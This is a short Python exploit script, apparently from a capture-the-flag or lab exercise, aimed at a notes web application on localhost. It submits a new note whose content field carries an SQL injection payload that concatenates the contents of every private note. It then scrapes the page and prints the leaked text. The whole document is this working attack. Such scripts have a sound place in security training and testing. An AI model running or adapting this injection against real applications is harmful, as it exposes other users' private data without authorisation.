from bs4 import BeautifulSoup
import requests
import os


url = 'http://localhost:8080'


def create_note(url, sql):
	data_of_new_note = {
		'title': os.urandom(8).hex(),
		'content': sql,
		'private': True
	}

	resp = requests.post(url + "/new", data_of_new_note)
	parsed = parser(data=resp.text)

	return f'[+] Created a new note: title - {parsed[0]}; content - {parsed[1]} | url: {resp.url}'


def parser(data):
	soup = BeautifulSoup(data, 'lxml')
	header = soup.h1.text
	data = soup.p.text
	return [header, data]
	

if __name__ == "__main__":
	print(create_note(url=url, sql='\' || (select group_concat(content) from notes where private = 1) || \''))